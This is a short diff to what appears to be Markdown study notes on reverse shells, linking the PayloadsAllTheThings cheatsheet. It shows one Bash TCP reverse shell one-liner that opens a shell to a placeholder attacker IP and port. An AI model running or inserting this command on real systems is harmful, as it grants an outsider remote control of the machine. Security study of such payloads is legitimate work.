@@ -1,3 +1,7 @@
+# PayloadsAllTheThings Reverse shell analysis
+
+[Reverse shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
 **Bash TCP**
 
 **1.`bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1`**
